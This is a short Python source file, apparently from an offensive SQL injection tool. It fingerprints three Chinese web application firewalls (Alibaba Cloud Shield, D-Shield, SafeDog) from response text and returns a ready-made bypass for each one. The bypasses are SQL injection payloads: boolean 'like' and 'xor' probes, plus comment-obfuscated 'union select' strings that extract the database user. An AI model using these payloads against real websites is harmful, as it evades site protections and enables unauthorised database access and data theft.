# 检测waf

class Waf:
    def __init__(self):
        self.wafName = {'name': None}

    def detect(self, text):
        aliyun = self.aliyun(text)
        Ddun = self.Ddun(text)
        safeDog = self.safeDog(text)
        if aliyun:
            return {'Flag': 'True', 'wafName': '[阿里云盾] 绕过方法 ?x=1 and 1 like 1 分割线 ?x=1 and 1 like 2'}
        elif Ddun:
            return {'Flag': 'True', 'wafName': '[D盾] 绕过方法 ?x=1 xor 0 分割线 ?x=1 xor 1'}
        elif safeDog:
            return {'Flag': 'True', 'wafName': '[安全狗] 绕过方法 /*/*//*/*!1 分割线 /*!and/*/**//*!/*!1*/, 注数据：?x=1/*!union/*/**//*!/*!select*/ 1,2,/*!user/*/**//*!/*!()*/'}
        else:
            return {'Flag': 'False'}



    def aliyun(self, text):
        return True if 'https://errors.aliyun.com/images' in text else ''

    def Ddun(self, text):
        return True if '<table width=400 align="center" cellpadding=0 cellspacing=0  style="border: 1px outset #000;">' in text else ''

    def safeDog(self, text):
        return True if 'http://404.safedog.cn' in text else ''